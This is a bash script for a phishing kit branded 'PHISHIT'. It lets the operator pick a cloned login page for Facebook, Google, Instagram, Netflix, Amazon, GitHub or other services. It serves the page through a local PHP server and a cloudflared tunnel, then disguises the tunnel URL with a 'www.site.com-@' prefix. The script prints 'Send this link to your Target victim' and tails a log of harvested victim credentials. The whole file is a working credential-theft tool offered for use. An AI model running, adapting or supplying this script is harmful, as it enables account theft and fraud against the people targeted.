#!/bin/bash
phi(){
CWD=$(pwd)
killall cloudflared > /dev/null 2>&1
killall cloudflare > /dev/null 2>&1
echo -e "
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗████████╗
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║╚══██╔══╝
██████╔╝███████║██║╚█████╗░███████║██║░░░██║░░░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║░░░██║░░░
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░░╚═╝░░░█" | pv -qL 500 | lolcat
echo
echo -e "▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
" | pv -qL 500 | lolcat
echo
echo -e "
█▄░█ █▄░█ █▀▀
█░▀█ █░▀█ █▄▄" | lolcat
echo
#<<.............colour................>>
C0="$(printf '\033[90m')"  B0="$(printf '\033[100m')"
C1="$(printf '\033[91m')"  B1="$(printf '\033[101m')"
C2="$(printf '\033[92m')"  B2="$(printf '\033[102m')"
C3="$(printf '\033[93m')"  B3="$(printf '\033[103m')"
C4="$(printf '\033[94m')"  B4="$(printf '\033[104m')"
C5="$(printf '\033[95m')"  B5="$(printf '\033[105m')"
C6="$(printf '\033[96m')"  B6="$(printf '\033[106m')"
C7="$(printf '\033[97m')"  B7="$(printf '\033[107m')"
R0="$(printf '\033[00m')"  R1="$(printf '\033[0;1m')"
D0="$(printf '\033[77m')"
#...................................................
echo
printf "\033[1;34mselect an option\n \033[0m"
echo -e "
1)>facebook
2)>google
3)>instagram
4)>whatsapp
5)>snapchat
6)>Telegram
7)>HOTSTAR
8)>Netflix
9)>Amazon
10)>flipkart
11)github
12)Twitter
13)> To exit" | lolcat
while true; do
printf "\033[1;44mselect an option==> \033[0m"
#................programe...............
read phis
if [[ $opt == '1' || $phis == '01' ]]; then
printf "\033[1;34myou selected facebook \033[0m"
pfolder=facebook
hoster='www.facebook.com-@'
break

elif [[ $phis == '2' || $phis == '02' ]]; then
printf "\033[1;34myou selected google \033[0m"
pfolder=google
hoster='www.google.com-@'
break

elif [[ $phis == '3' || $phis == '03' ]]; then
printf "\033[1;34myou selected instagram \033[0m"
pfolder=instagram
hoster='www.instagram.com-@'
break

elif [[ $phis == '4' || $phis == '04' ]]; then
pfolder='whatsapp'
hoster='www.whatsapp.com-@'
break

elif [[ $phis == '5' || $phis == '05' ]]; then                        pfolder='snapchat'
hoster='www.snapchat.com-@'
break

elif [[ $phis == '6' || $phis == '06' ]]; then
pfolder='telegram'
hoster='www.telegram.com-@'
break

elif [[ $phis == '7' || $phis == '07' ]]; then
pfolder='HOTSTAR'
hoster='www.hotstar.com-@'
break

elif [[ $phis == '8' || $phis == '08' ]]; then
pfolder='Netflix'
hoster='www.netflix.com-@'
break

elif [[ $phis == '9' || $phis == '09' ]]; then
pfolder='Amazon'
hoster='www.amazon.com-@'
break

elif [[ $phis == '10' ]]; then
pfolder='flipkart'
hoster='www.flipkart.com-@'
break

elif [[ $phis == '11' ]]; then
pfolder='github'
hoster='www.github.com-@'
break

elif [[ $phis == '12' ]]; then
pfolder='twitter'
hoster='www.twitter.com-@'
break

elif [[ $phis == '13' ]]; then
exit 1
else
printf "PLEASE SELECT A VALID OPTION!!\n"
fi
done

wait() {
sleep 0.3
}
distro=$(uname -o)
echo
printf "ITS STARTING PLEASE WAIT......\n" | lolcat
echo
cd requirments/assets/sites/
cd ${pfolder}/
echo
printf "${C2}STARTING SERVER${R0}"
printf "${C2}..........${R0}\n" | pv -qL 10
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo
if [[ $distro == *'Android'* ]]; then
termux-chroot cloudflared tunnel -url 127.0.0.1:4444 --logfile ${CWD}/.cloudflare-log > /dev/null 2>&1 &
else
cloudflared tunnel -url 127.0.0.1:4444 --logfile ${CWD}/.cloudflare-log > /dev/null 2>&1 &
fi
sleep 7
echo
link=$(grep -o '[-a0-z9]*\.trycloudflare.com' "${CWD}/.cloudflare-log")
rm -rf ${CWD}/.cloudflare-log
#r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
#r2=$(printf "${r1/\"http:\/\//}")
#r3=$(printf "${r2/\"https:\/\//}")
#r4=$(printf "${r3/\",/}")
#link=$(printf "${r4/%\",/}")
echo; wait
printf "${C7}<<<${R0}${C1}---------------${R0}${B1}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R1}${C1}---------------${R0}${C7}>>>${R0}\n"; wait
echo; wait
printf "${C4}${R0}${C4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://${hoster}$link
wait
echo
wait
echo -e "
                 _  _
                / \|_)
                \_/| \\ short links:-
" | pv -qL 50 | lolcat
echo; wait
printf "${C4}${R0}${C4} Send this link to your Target victim :${R0}${D0} %s${R0}\n" https://$link


if [[ -e log.txt ]]; then
> log.txt
fi
echo
echo
tail -f log.txt
}
phi
